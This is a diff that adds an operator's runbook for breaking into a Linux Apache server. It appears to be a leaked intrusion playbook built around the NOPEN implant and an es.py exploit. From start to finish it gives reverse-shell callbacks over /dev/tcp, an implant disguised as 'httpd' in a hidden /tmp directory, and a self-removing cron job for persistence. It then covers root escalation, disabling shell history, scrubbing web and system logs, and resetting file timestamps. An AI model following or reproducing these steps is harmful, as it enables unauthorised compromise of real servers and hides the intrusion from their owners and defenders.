@@ -1,0 +1,250 @@
+
+
+## NOTE: This assumes redirecting the exploit via NOPEN.
+
+## The idea behind the pairs of commands everywhere is to attack two
+## different ranges simultaneously. The ports will let us know which
+## was successfull (look for callback in first or second NOPEN
+## -tunnel window, indicating the first or second exploit command
+## was successful). We want to know which worked so we can take note
+## of the offset that worked (or thereabouts).
+##
+
+
+## Some vi % lines to make substitutions for you.
+## Change second occurrence in each line here, then (ESCape first)
+## paste these in.
+:%s/TARGET_IP/TARGET_IP/g
+:%s/NETCAT_PORT1/NETCAT_PORT1/g
+:%s/NETCAT_PORT2/NETCAT_PORT2/g
+:%s/NOPENBINARY/NOPENBINARY/g
+:%s/NOPENPORT/NOPENPORT/g
+
+
+##############################################
+###   TWO NOPEN TUNNEL WINDOWS
+##############################################
+## NOPEN TUNNEL WINDOW #1 (split between two distinct NOPEN sessions)
+-tunnel
+l 40343 TARGET_IP 443
+r NETCAT_PORT1
+
+## NOPEN TUNNEL WINDOW #2 (split between two distinct NOPEN sessions)
+-tunnel
+l 40443 TARGET_IP 443
+r NETCAT_PORT2 127.0.0.1 NETCAT_PORT1
+
+
+##############################################
+###   LOCAL LISTENER FOR SHELL CALLBACK
+##############################################
+## SET UP LOCAL LISTENER FOR INITIAL SHELL CALLBCK IN SCRIPTED WINDOW.
+##
+## scripme gives you a scripted window if you need another
+scripme
+
+## then paste this into it
+nc -vv -l -p NETCAT_PORT1
+
+
+##############################################
+###   LOCAL ALARM FOR CALLBACK SESSION THEN
+##    LOCAL LISTENER FOR BINARY UPLOAD CALLBACK
+##############################################
+## SET UP LOCAL CALLBACK IN SCRIPTED WINDOW. 
+## ENTIRE block here can be pasted (once NETCAT_PORT1 and NOPENBINARY
+## are set accordingly).
+
+## scripme gives you a scripted window if you need another
+scripme
+
+## then paste this ENTIRE BLOCK into it
+while [ 1 ] ; do 
+   echo this repeats after netcat below exits
+   while [ 1 ] ; do
+      netstat -an | grep NETCAT_PORT1.*ESTAB && break
+      sleep 3
+   done
+   sleep 1 ; echo -e "\aINCOMING" ; sleep 1 ; echo -e "\aINCOMING" ;
+   sleep 1 ; echo -e "\aINCOMING" ; sleep 1 ; echo -e "\aINCOMING"
+   nc -vv -l -p NETCAT_PORT1 < /current/up/NOPENBINARY
+   sleep 1
+   echo "Use ^C to get out of this loop"
+done
+
+
+##############################################
+###   TWO LOCAL EXPLOIT WINDOWS (scripme scripts these for you)
+##############################################
+## This makes two nicely sized scripted windows for the exploits
+scripme -X"-geometry 102x24+652-46"
+scripme -X"-geometry 102x24+0-46"
+
+
+## Pick a callback method (use just one of these pairs of export lines,
+## most likely the first). The first line in the first exploit window,
+## the second in the second.
+
+# Call back with interactive shell via PITCH_IP
+export REMOTECOMMAND1="(sh</dev/tcp/PITCH_IP/NETCAT_PORT1>&0 2>&0)"
+export REMOTECOMMAND2="(sh</dev/tcp/PITCH_IP/NETCAT_PORT2>&0 2>&0)"
+
+# Call back with interactive shell via LOCAL_IP
+export REMOTECOMMAND1="(sh</dev/tcp/LOCAL_IP/NETCAT_PORT1>&0 2>&0)"
+export REMOTECOMMAND2="(sh</dev/tcp/LOCAL_IP/NETCAT_PORT2>&0 2>&0)"
+
+# Call back with output from some commands
+export REMOTECOMMAND1="(sh</dev/tcp/PITCH_IP/NETCAT_PORT1>&0 2>&0)"
+export REMOTECOMMAND2="(sh</dev/tcp/PITCH_IP/NETCAT_PORT2>&0 2>&0)"
+
+
+## Now, whichever REMOTECOMMAND* lines were used, here is your first
+## and second window's exploit line. Note the ranges do not overlap. 
+es.py 127.0.0.1 40343 5000 0xbfffe000 0xbfffefff 0x4 0x0 "$REMOTECOMMAND1"
+es.py 127.0.0.1 40443 5000 0xbffff000 0xbffffff0 0x4 0x0 "$REMOTECOMMAND2
+
+
+
+##############################################
+###   IN LOCAL SHELL LISTENER WHEN IT GETS A CALLBACK
+##############################################
+##
+## REMOTE in initial shell callback to netcat:
+##
+## Are we there yet?
+id
+
+## If so, this whole block can go up (to next blank line)
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+pwd
+exec 3<&- 4<&- 5<&- 6<&- 7<&- 8<&- 9<&- 10<&- 11<&- 12<&- 13<&- 255<&-
+uname -a
+ls -alrt /tmp
+
+
+## Look ok? Our temp dir below not there yet? Then this whole block
+mkdir -p /tmp/.httpd-lock; chmod 700 /tmp/.httpd-lock; ls -lctra /tmp
+cd /tmp/.httpd-lock; pwd
+ls -alrt
+
+## Now upload to target (be sure listener and tunnels are ok)
+cat</dev/tcp/PITCH_IP/NETCAT_PORT1>httpd ; ls -la
+
+chmod 700 httpd
+netstat -an | egrep "LISTEN|3275"
+
+## CALLBACK? Set up for callback:
+-nrtun NOPENPORT
+D=-cPITCH_IP:NOPENPORT PATH=. httpd
+
+## LISTENER?
+PATH=. httpd
+-nstun TARGET_IP
+
+##############################################
+###   REMOTE - first (apache) NOPEN window
+###   LOCAL ELEVATION
+##############################################
+## 
+##
+
+## If we're lucky and already root you can skip local elevate
+## (use eventstart - ptrace won't work on RH9)
+id
+
+## OPTIONAL, just in case EVENTSTART bounces box, you can 
+## start a cron job to call nopen in case of a reboot (if you won't
+## be able to reexploit) set the time to remove itself to the next
+## hour (use both local and UTC time)
+
+vi /current/down/crontab:
+0,5,10,15,20,25,30,35,40,45,50,55 * * * * sh -c "D=-cPITCH_IP:NOPENPORT /tmp/.httpd-lock/crond"
+0 1,17 * * * crontab -r
+
+### on target:
+date; date -u
+-ls -t /var/log/cron
+-ls -t /var/spool/cron
+-cat /etc/syslog.conf
+crontab -l
+-put /current/down/crontab crontab
+-cat crontab
+crontab crontab
+crontab -l
+rm crontab
+date
+
+
+id
+-put /current/up/h h
+
+## Use h to elevate
+-shell
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+id
+pwd
+ls -l
+PATH=. h
+id
+
+## Are we root? run a new nopen then
+## CALLBACK? Set up for callback:
+-nrtun NOPENPORT
+D=-cPITCH_IP:NOPENPORT PATH=. httpd
+
+## LISTENER? (note the port incremented since first is still there)
+PATH=. httpd
+-nstun TARGET_IP 32755 
+
+## Once we have a root NOPEN, this apache one can go
+exit
+exit
+
+## in the apache owned NOPEN
+-burn
+
+
+
+##############################################
+###   REMOTE - second (root) NOPEN window
+##############################################
+-nstun TARGET_IP 32755 
+id
+
+
+## Clean logs
+## Logging:
+##
+
+## Use these times (or adjust them) later
+-ls -n /var/log/httpd
+
+-lt /var/log/httpd
+        /var/log/httpd/ssl_access_log
+        /var/log/httpd/ssl_request_log
+        /var/log/httpd/ssl_error_log
+        /var/log/httpd/error_log
+
+-lt /var/log
+        /var/log/messages
+        /var/log/secure
+        /var/log/maillog
+
+
+
+## use -gs grepout to clean logs (it will use time in last line we
+## preserve to touch file back).
+
+## NOTE: This will have TONS of output. Suffer through it.
+
+## This looks odd without quotes around the argument--but that's fine.
+-gs grepout PITCH_IP|Segmentation /var/log/httpd
+
+
+## Use -touch -t lines from above to fix times, or -touch reffile targetfile if that makes more sense
+
+-touch
